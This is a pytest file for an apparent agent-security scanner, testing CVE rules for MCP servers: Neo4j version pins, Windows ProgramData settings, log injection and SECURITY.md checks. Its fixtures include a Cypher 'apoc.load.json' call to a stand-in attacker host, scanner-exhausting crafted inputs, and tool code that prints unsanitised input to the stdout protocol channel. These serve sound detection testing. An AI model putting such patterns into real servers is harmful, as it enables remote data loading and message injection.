"""Tests for the v0.3.1 CVE rule family.

Covers:
- AAK-STDIO-001     CVE-2026-30615 + Ox architectural class (see also test_stdio_injection.py)
- AAK-NEO4J-001     CVE-2026-35402
- AAK-CLAUDE-WIN-001 CVE-2026-35603
- AAK-LOGINJ-001    CVE-2026-6494
- AAK-SEC-MD-001    SECURITY.md requirement
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

import agent_audit_kit
from agent_audit_kit.scanners import (
    agent_config,
    log_injection,
    marketplace_manifest,
    neo4j_cve,
)


# ---------------------------------------------------------------------------
# AAK-NEO4J-001 (CVE-2026-35402)
# ---------------------------------------------------------------------------


def test_neo4j_vulnerable_pin_fires(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("mcp-neo4j-cypher==0.5.0\n")
    findings, _ = neo4j_cve.scan(tmp_path)
    ids = {f.rule_id for f in findings}
    assert "AAK-NEO4J-001" in ids


def test_neo4j_pin_after_blank_lines_names_its_line(tmp_path: Path) -> None:
    """The match opened at the first blank line above the pin, so its text held a
    newline and `find_line_number` found no line for the finding."""
    (tmp_path / "requirements.txt").write_text("flask\n\n\nmcp-neo4j-cypher==0.5.0\n")
    findings, _ = neo4j_cve.scan(tmp_path)
    assert [f.line_number for f in findings if f.rule_id == "AAK-NEO4J-001"] == [4]


@pytest.mark.parametrize("requirements", ["\n" * 1_999_000 + "x", "mcp-neo4j-cypher" + " " * 1_999_000 + "x"])
def test_neo4j_pin_reads_a_crafted_requirements_file_in_linear_time(tmp_path: Path, requirements: str) -> None:
    """From every line start in a run of blank lines `^\\s*` read to the end of the
    run, and two `\\s*` around the optional operator split a blank run every way,
    so both shapes grew with the square. The bound is loose for slow CI runners."""
    import time

    (tmp_path / "requirements.txt").write_text(requirements, encoding="utf-8")
    started = time.perf_counter()
    neo4j_cve.scan(tmp_path)
    assert time.perf_counter() - started < 5.0


def test_neo4j_patched_pin_is_quiet(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("mcp-neo4j-cypher>=0.6.0\n")
    findings, _ = neo4j_cve.scan(tmp_path)
    assert not any(f.rule_id == "AAK-NEO4J-001" for f in findings)


@pytest.mark.parametrize(("name", "text", "line"), [
    # The pin took the first number after the name, had no place for extras, and
    # never opened the pyproject.toml its docstring promised.
    ("requirements.txt", "mcp-neo4j-cypher<0.6.0\n", 1),
    ("requirements.txt", "mcp-neo4j-cypher[all]==0.5.0\n", 1),
    ("requirements-dev.txt", "pytest\nmcp-neo4j-cypher>=0.4,<0.7  # upper bound only\n", 2),
    ("dev-requirements.txt", "mcp-neo4j-cypher~=0.5.0\n", 1),
    ("pyproject.toml", '[project]\nname = "d"\nversion = "0.1.0"\ndependencies = ["mcp-neo4j-cypher==0.5.0"]\n', 4),
    ("pyproject.toml", '[tool.poetry.dependencies]\npython = "^3.11"\nmcp-neo4j-cypher = "^0.5.0"\n', 3),
])
def test_neo4j_pin_reads_ranges_extras_and_pyproject(tmp_path: Path, name: str, text: str, line: int) -> None:
    (tmp_path / name).write_text(text, encoding="utf-8")
    findings, _ = neo4j_cve.scan(tmp_path)
    assert [f.line_number for f in findings if f.rule_id == "AAK-NEO4J-001"] == [line]


@pytest.mark.parametrize(("name", "text"), [
    ("requirements.txt", "mcp-neo4j-cypher\n"),                     # no version stated
    ("requirements.txt", "mcp-neo4j-cypher[all]>=0.6.0\n"),
    ("pyproject.toml", '[project]\nname = "d"\ndependencies = ["mcp-neo4j-cypher>=0.6.0,<1"]\n'),
    ("package.json", '{"dependencies": {"mcp-neo4j-cypher": "0.5.0"}}'),  # a PyPI package; npm has none
])
def test_neo4j_pin_stays_quiet(tmp_path: Path, name: str, text: str) -> None:
    (tmp_path / name).write_text(text, encoding="utf-8")
    findings, _ = neo4j_cve.scan(tmp_path)
    assert not any(f.rule_id == "AAK-NEO4J-001" for f in findings)


def test_neo4j_apoc_pattern_fires(tmp_path: Path) -> None:
    (tmp_path / "server.py").write_text(
        'q = "CALL apoc.load.json(\'https://attacker/\')"\n'
        "session.run(q, read_only=True)\n"
    )
    findings, _ = neo4j_cve.scan(tmp_path)
    assert any(f.rule_id == "AAK-NEO4J-001" for f in findings)


# ---------------------------------------------------------------------------
# AAK-CLAUDE-WIN-001 (CVE-2026-35603)
# ---------------------------------------------------------------------------


def test_claude_win_programdata_without_setup_ps1_fires(tmp_path: Path) -> None:
    target_dir = tmp_path / "ProgramData" / "ClaudeCode"
    target_dir.mkdir(parents=True)
    (target_dir / "managed-settings.json").write_text("{}")
    findings, _ = agent_config.scan(tmp_path)
    ids = [f.rule_id for f in findings]
    assert "AAK-CLAUDE-WIN-001" in ids, ids


def test_claude_win_programdata_with_hardened_setup_ps1_is_quiet(tmp_path: Path) -> None:
    target_dir = tmp_path / "ProgramData" / "ClaudeCode"
    target_dir.mkdir(parents=True)
    (target_dir / "managed-settings.json").write_text("{}")
    (target_dir / "setup.ps1").write_text(
        "Write-Host 'setup'\n"
        "icacls $PSScriptRoot /inheritance:d /grant:r 'TrustedInstaller:F'\n"
    )
    findings, _ = agent_config.scan(tmp_path)
    assert not any(f.rule_id == "AAK-CLAUDE-WIN-001" for f in findings)


def test_claude_win_setup_ps1_is_read_up_to_the_source_cap(tmp_path: Path) -> None:
    """The sibling setup.ps1 was read whole: one symlinked to a 200 MB file took
    the scanner past 400 MB. It is read up to the 512 KB source cap, and one over
    the cap counts as not running icacls, as one that cannot be read did."""
    import tracemalloc

    from agent_audit_kit.rules.builtin import get_rule

    big = tmp_path / "big.ps1"
    with open(big, "wb") as fh:
        fh.truncate(200_000_000)
    target_dir = tmp_path / "proj" / "ProgramData" / "ClaudeCode"
    target_dir.mkdir(parents=True)
    (target_dir / "managed-settings.json").write_text("{}")
    (target_dir / "setup.ps1").symlink_to(big)
    tracemalloc.start()
    try:
        findings, _ = agent_config.scan(tmp_path / "proj")
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 20_000_000, peak
    assert [f.rule_id for f in findings if f.rule_id == "AAK-CLAUDE-WIN-001"] == ["AAK-CLAUDE-WIN-001"]
    assert "over 512 KB is not read" in get_rule("AAK-CLAUDE-WIN-001").limitations


def test_claude_win_non_programdata_is_quiet(tmp_path: Path) -> None:
    target_dir = tmp_path / "home" / "user" / ".claude"
    target_dir.mkdir(parents=True)
    (target_dir / "managed-settings.json").write_text("{}")
    findings, _ = agent_config.scan(tmp_path)
    assert not any(f.rule_id == "AAK-CLAUDE-WIN-001" for f in findings)


# ---------------------------------------------------------------------------
# AAK-LOGINJ-001 (CVE-2026-6494)
# ---------------------------------------------------------------------------


def test_loginj_tool_logs_unsanitized_param_fires(tmp_path: Path) -> None:
    (tmp_path / "tool.py").write_text(
        "import logging\n"
        "from mcp.server.fastmcp import FastMCP\n"
        "mcp = FastMCP('x')\n"
        "log = logging.getLogger(__name__)\n"
        "\n"
        "@mcp.tool()\n"
        "def run(toolsetroute: str) -> str:\n"
        "    log.info('received route %s', toolsetroute)\n"
        "    return toolsetroute\n"
    )
    findings, _ = log_injection.scan(tmp_path)
    assert any(f.rule_id == "AAK-LOGINJ-001" for f in findings)


def test_loginj_sanitized_tool_is_quiet(tmp_path: Path) -> None:
    (tmp_path / "tool.py").write_text(
        "import logging\n"
        "from mcp.server.fastmcp import FastMCP\n"
        "mcp = FastMCP('x')\n"
        "log = logging.getLogger(__name__)\n"
        "\n"
        "@mcp.tool()\n"
        "def run(toolsetroute: str) -> str:\n"
        "    safe = toolsetroute.replace('\\r', '').replace('\\n', '')\n"
        "    log.info('received route %s', safe)\n"
        "    return safe\n"
    )
    findings, _ = log_injection.scan(tmp_path)
    assert not any(f.rule_id == "AAK-LOGINJ-001" for f in findings)


_LOGINJ_FN = '''import logging
import sys

from mcp.server.fastmcp import FastMCP

mcp = FastMCP("notes")
logger = logging.getLogger(__name__)
log = logger


@mcp.tool()
def add_note(text: str, count: int) -> str:
    @@STMT@@
    return text
'''

_LOGINJ_METHOD = '''import logging

from mcp.server.fastmcp import FastMCP

mcp = FastMCP("notes")


class Notes:
    def __init__(self) -> None:
        self.logger = logging.getLogger(__name__)

    @mcp.tool()
    def add_note(self, text: str) -> str:
        @@STMT@@
        return text
'''


def _loginj(tmp_path: Path, template: str, stmt: str) -> list[tuple[int | None, str]]:
    (tmp_path / "server.py").write_text(template.replace("@@STMT@@", stmt), encoding="utf-8")
    findings, _ = log_injection.scan(tmp_path)
    return [(f.line_number, f.evidence) for f in findings if f.rule_id == "AAK-LOGINJ-001"]


@pytest.mark.parametrize(("stmt", "via"), [
    ('print("adding", text)', "print"),
    ('print(f"adding {text}", file=sys.stderr, flush=True)', "print"),
    ('logging.info("adding %s", text)', "logging.info"),
    ('logging.warning(f"adding {text}")', "logging.warning"),
    ('logger.exception("adding %s failed", text)', "logger.exception"),
    ('log.exception("adding %s failed", text)', "log.exception"),
    ('log.critical("adding %s", text)', "log.critical"),
    ('logger.warn("adding %s", text)', "logger.warn"),
])
def test_loginj_reads_print_and_every_logger_level(tmp_path: Path, stmt: str, via: str) -> None:
    hits = _loginj(tmp_path, _LOGINJ_FN, stmt)
    assert [line for line, _ in hits] == [13]
    assert f"via {via}(...)" in hits[0][1]


@pytest.mark.parametrize(("stmt", "reported"), [
    ('print("adding", text)', True),
    ('print("adding", text, file=sys.stdout)', True),
    ('print("adding", text, file=sys.stderr, flush=True)', True),
    # `file=None` is print's default, stdout.
    ('print("adding", text, file=None)', True),
    # A stream imported bare (`from sys import stderr`).
    ('print("adding", text, file=stderr)', True),
    # A file handle is a data file, not a log stream or the protocol channel.
    ('print(text, ",", count, file=out)', False),
    ("print(text, file=handle.stream)", False),
])
def test_loginj_reads_print_only_to_stdout_or_stderr(tmp_path: Path, stmt: str, reported: bool) -> None:
    assert bool(_loginj(tmp_path, _LOGINJ_FN, stmt)) is reported


def test_loginj_text_says_stdout_carries_the_protocol() -> None:
    """In a STDIO server stdout is the JSON-RPC channel: caller input printed
    there can inject a message, which stripping control characters does not stop."""
    from agent_audit_kit.rules.builtin import RULES

    rule = RULES["AAK-LOGINJ-001"]
    for text in (rule.description, rule.remediation):
        assert "stdout" in text and "stderr" in text, text
    assert "inject" in rule.description


def test_loginj_does_not_read_a_logger_held_on_the_instance(tmp_path: Path) -> None:
    """Measured and left out (stated in the limitation): on 9,137 Python files
    from code searches for MCP servers the attribute form added 69 findings,
    63.8% true."""
    assert _loginj(tmp_path, _LOGINJ_METHOD, 'self.logger.info("adding %s", text)') == []


def test_loginj_reads_sys_stderr_like_sys_stdout(tmp_path: Path) -> None:
    for stream in ("stdout", "stderr"):
        hits = _loginj(tmp_path, _LOGINJ_FN, f'sys.{stream}.write(text + "\\n")')
        assert [line for line, _ in hits] == [13], stream
        assert f"via sys.{stream}(...)" in hits[0][1]


@pytest.mark.parametrize("stmt", [
    'print("adding a note")',
    'logging.basicConfig(level="INFO")',
    "logging.getLogger(text)",
    "sys.stderr.flush()",
    'print("adding", text.replace("\\n", " "))',
    '_logger.info("adding %s", text)',
])
def test_loginj_static_text_and_other_calls_stay_silent(tmp_path: Path, stmt: str) -> None:
    """A call with no parameter in it, a `logging` call that is not a level,
    a sanitised value, and a logger under another name (stated in the limitation)."""
    assert _loginj(tmp_path, _LOGINJ_FN, stmt) == []


# Verification (Low): `sanitize` was matched as text anywhere in the function, in
# any case, so a docstring saying "Logs the unsanitized note." cleared a raw
# print. A sanitising call is read by the name of what it calls now.
@pytest.mark.parametrize(("stmt", "reported"), [
    ('"""Logs the unsanitized note."""\n    print(text)', True),
    ("# sanitize this later\n    print(text)", True),
    ("sanitized = False\n    print(text)", True),
    ("names = list(map(sanitize, [text]))\n    print(text)", True),
    ("text = sanitize(text)\n    print(text)", False),
    ("text = notes._sanitize_for_log(text)\n    print(text)", False),
    ("text = utils.strip_control_chars(text)\n    print(text)", False),
    ("text = escape_controls(text)\n    print(text)", False),
    ("text = Sanitizer().clean(text)\n    print(text)", False),
])
def test_loginj_a_sanitising_call_is_read_by_its_name(tmp_path: Path, stmt: str, reported: bool) -> None:
    assert bool(_loginj(tmp_path, _LOGINJ_FN, stmt)) is reported


def test_loginj_many_tool_functions_read_in_linear_time(tmp_path: Path) -> None:
    """Each tool function's body was cut from a fresh split of the whole file, so
    6,000 tool functions took 3.1 s, growing with the square of their number."""
    import time

    timings = []
    for count in (1_200, 12_000):
        src = "from mcp.server.fastmcp import FastMCP\nmcp = FastMCP('x')\n" + "".join(
            f"@mcp.tool()\ndef t{i}(a):\n    return a\n" for i in range(count)
        )
        root = tmp_path / str(count)
        root.mkdir()
        (root / "server.py").write_text(src, encoding="utf-8")
        started = time.perf_counter()
        _, scanned = log_injection.scan(root)
        timings.append(time.perf_counter() - started)
        assert scanned == {"server.py"}, "the file must be read, not skipped"
    small, large = timings
    assert large < 30 * small + 1.0, (small, large)
    assert large < 5.0, large


# Verification of a323344c (2026-10-17, Medium, pre-existing): each tool function
# walked its whole subtree, nested tool functions included, and searched its
# whole range for sanitising code, so a call inside 99 nested tools was read 99
# times and reported 99 times, once per tool around it: 68.5 s at 494 KB. A call
# is read once now, for the innermost tool function around it, and sanitising
# code is found once per file.
_LOGINJ_CHILD = (
    "import json, sys, time\n"
    "from pathlib import Path\n"
    "from agent_audit_kit.scanners.log_injection import scan\n"
    "started = time.perf_counter()\n"
    "findings, _ = scan(Path(sys.argv[1]))\n"
    "print(json.dumps([time.perf_counter() - started, [[f.line_number, f.evidence] for f in findings]]))\n"
)


def _loginj_in_child(root: Path) -> tuple[float, list[list[object]]]:
    package_root = Path(agent_audit_kit.__file__).resolve().parent.parent
    env = {**os.environ, "PYTHONPATH": str(package_root)}
    done = subprocess.run(
        [sys.executable, "-c", _LOGINJ_CHILD, str(root)], capture_output=True, text=True, timeout=120, env=env
    )
    assert done.returncode == 0, done.stderr
    elapsed, findings = json.loads(done.stdout)
    return elapsed, findings


def _nested_tools(depth: int, statements: int) -> str:
    lines = ["from mcp.server.fastmcp import FastMCP", "mcp = FastMCP('x')"]
    for level in range(depth):
        lines += [" " * level + "@mcp.tool()", " " * level + f"def f{level}(event, client, t):"]
    lines.append(" " * depth + "a=t;" * statements + "print(t)")
    return "\n".join(lines) + "\n"


def test_loginj_nested_tool_functions_read_in_linear_time(tmp_path: Path) -> None:
    """The bound is 10 s, not 5: parsing and walking the 600,000 nodes of 120,000
    statements takes 1.2 s here and more on a loaded runner, against 68.5 s before."""
    text = _nested_tools(99, 120_000)
    assert len(text.encode("utf-8")) <= 512_000
    (tmp_path / "server.py").write_text(text, encoding="utf-8")
    elapsed, findings = _loginj_in_child(tmp_path)
    assert [line for line, _ in findings] == [text.count("\n")]
    assert "'f98'" in str(findings[0][1])
    assert elapsed < 10.0, elapsed


_LOGINJ_NESTED = """import logging

from mcp.server.fastmcp import FastMCP

mcp = FastMCP("notes")
logger = logging.getLogger(__name__)


@mcp.tool()
def outer(query: str) -> str:
    def helper(text):
        logger.info("helper %s", query)

    @mcp.tool()
    def inner(note: str) -> str:
        print(note)
        print(query)
        return note

    helper(query)
    return query
"""


# Verification of e1cc1f9e (2026-10-17, Low, pre-existing): each log call's
# arguments were walked whole for a parameter, so a call nested in another's
# arguments was walked again for every call around it: lines of `print(` 190
# deep took 14.6 s at 479 KB, and of `logger.info(` 12.6 s (main 8.1 s). Whether
# a subtree names a parameter is decided once per node now. Most of the time
# left is building the findings, one per call, so chains 190 deep are timed
# against chains 19 deep in the same 480,000 characters, which give about as
# many: CPU time in a child, so a slow or loaded machine scales both.
_LOGINJ_CHAIN_CHILD = (
    "import sys, tempfile, time\n"
    "from pathlib import Path\n"
    "from agent_audit_kit.scanners.log_injection import scan\n"
    "call, depth = sys.argv[1], int(sys.argv[2])\n"
    "unit = call * depth + 'request' + ')' * depth + '\\n    '\n"
    "head = \"from mcp.server.fastmcp import FastMCP\\nmcp = FastMCP('x')\\n@mcp.tool()\\ndef t(request):\\n    \"\n"
    "text = head + unit * (480_000 // len(unit)) + '\\n'\n"
    "assert len(text.encode('utf-8')) <= 512_000\n"
    "with tempfile.TemporaryDirectory() as root:\n"
    "    (Path(root) / 'server.py').write_text(text, encoding='utf-8')\n"
    "    started = time.process_time()\n"
    "    findings, _ = scan(Path(root))\n"
    "    print(time.process_time() - started, len(findings))\n"
)


def _loginj_chain_in_child(call: str, depth: int) -> tuple[float, int]:
    package_root = Path(agent_audit_kit.__file__).resolve().parent.parent
    env = {**os.environ, "PYTHONPATH": str(package_root)}
    done = subprocess.run(
        [sys.executable, "-c", _LOGINJ_CHAIN_CHILD, call, str(depth)],
        capture_output=True, text=True, timeout=120, env=env,
    )
    assert done.returncode == 0, done.stderr
    elapsed, found = done.stdout.split()
    return float(elapsed), int(found)


@pytest.mark.parametrize(("call", "counts"), [("print(", (62_890, 67_830)), ("logger.info(", (35_207, 36_670))])
def test_loginj_log_calls_nested_in_arguments_read_in_linear_time(call: str, counts: tuple[int, int]) -> None:
    """Every call in a chain names the parameter, so each is a finding. e1cc1f9e
    took 3.05 s and 9.26 s (`print(`), 1.62 s and 7.92 s (`logger.info(`); the
    fixed reader takes about the same at both depths."""
    (shallow, shallow_count), (deep, deep_count) = (_loginj_chain_in_child(call, depth) for depth in (19, 190))
    assert (shallow_count, deep_count) == counts
    assert deep < 2 * shallow + 0.5, (shallow, deep)
    assert deep < 10.0, deep


def test_loginj_reads_a_call_for_the_innermost_tool_around_it(tmp_path: Path) -> None:
    """A call in a nested helper is the tool's around it, as before. A call in a
    nested tool is that tool's alone, read with its parameters: `print(query)`
    there names the outer tool's parameter and is not reported (stated in the
    limitation), where the outer tool used to report it."""
    (tmp_path / "server.py").write_text(_LOGINJ_NESTED, encoding="utf-8")
    findings, _ = log_injection.scan(tmp_path)
    assert sorted((f.line_number, f.evidence.split("'")[1]) for f in findings) == [(12, "outer"), (16, "inner")]


@pytest.mark.parametrize("cleaning", [
    "        return sanitize(note)",
    '        return note.replace("\\r", "")',
])
def test_loginj_a_nested_tool_that_sanitises_clears_the_one_around_it(tmp_path: Path, cleaning: str) -> None:
    """A function's sanitising calls and code include the functions nested in it,
    tool functions too, as before."""
    src = (
        "from mcp.server.fastmcp import FastMCP\n\nmcp = FastMCP('notes')\n\n\n"
        "@mcp.tool()\ndef outer(query: str) -> str:\n"
        "    @mcp.tool()\n    def inner(note: str) -> str:\n"
        f"{cleaning}\n\n"
        "    print(query)\n    return query\n"
    )
    (tmp_path / "server.py").write_text(src, encoding="utf-8")
    assert log_injection.scan(tmp_path)[0] == []


def test_loginj_non_tool_function_ignored(tmp_path: Path) -> None:
    (tmp_path / "util.py").write_text(
        "import logging\n"
        "log = logging.getLogger(__name__)\n"
        "\n"
        "def run(route: str) -> str:\n"
        "    log.info('route %s', route)\n"
        "    return route\n"
    )
    findings, _ = log_injection.scan(tmp_path)
    assert not any(f.rule_id == "AAK-LOGINJ-001" for f in findings)


# ---------------------------------------------------------------------------
# AAK-SEC-MD-001
# ---------------------------------------------------------------------------


def test_security_md_required_for_mcp_named_repo(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "my-mcp-server"\nkeywords = ["mcp"]\n'
    )
    # No SECURITY.md, no security_contact.
    findings, _ = marketplace_manifest.scan(tmp_path)
    assert any(f.rule_id == "AAK-SEC-MD-001" for f in findings)


def test_security_md_present_is_quiet(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "my-mcp-server"\nkeywords = ["mcp"]\n'
    )
    (tmp_path / "SECURITY.md").write_text("# Security\n\nReport at security@example.com\n")
    findings, _ = marketplace_manifest.scan(tmp_path)
    assert not any(f.rule_id == "AAK-SEC-MD-001" for f in findings)


@pytest.mark.parametrize("where", ["SECURITY.md", ".github/SECURITY.md", "docs/SECURITY.md"])
def test_security_md_in_any_folder_github_reads_is_quiet(tmp_path: Path, where: str) -> None:
    """GitHub reads a community health file such as SECURITY.md from the
    repository root, `.github/` or `docs/`, in that order of precedence after
    `.github/` (docs.github.com, "Creating a default community health file").
    A repo that kept its policy in `docs/` was told it shipped none."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "my-mcp-server"\nkeywords = ["mcp"]\n'
    )
    policy = tmp_path / where
    policy.parent.mkdir(parents=True, exist_ok=True)
    policy.write_text("# Security\n\nReport at security@example.com\n")
    findings, _ = marketplace_manifest.scan(tmp_path)
    assert not any(f.rule_id == "AAK-SEC-MD-001" for f in findings)


@pytest.mark.parametrize("where", ["security/SECURITY.md", "packages/server/SECURITY.md"])
def test_security_md_outside_those_folders_still_fires(tmp_path: Path, where: str) -> None:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "my-mcp-server"\nkeywords = ["mcp"]\n'
    )
    policy = tmp_path / where
    policy.parent.mkdir(parents=True, exist_ok=True)
    policy.write_text("# Security\n\nReport at security@example.com\n")
    findings, _ = marketplace_manifest.scan(tmp_path)
    assert any(f.rule_id == "AAK-SEC-MD-001" for f in findings)


def test_security_contact_in_pyproject_satisfies(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\n'
        'name = "my-mcp-server"\n'
        'keywords = ["mcp"]\n'
        'urls = { Security = "https://example.com/security" }\n'
    )
    findings, _ = marketplace_manifest.scan(tmp_path)
    assert not any(f.rule_id == "AAK-SEC-MD-001" for f in findings)


def test_non_mcp_repo_not_required(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "totally-normal-lib"\n')
    findings, _ = marketplace_manifest.scan(tmp_path)
    assert not any(f.rule_id == "AAK-SEC-MD-001" for f in findings)


def _ignore() -> None:  # keep os import used (pyright noise-control)
    _ = os
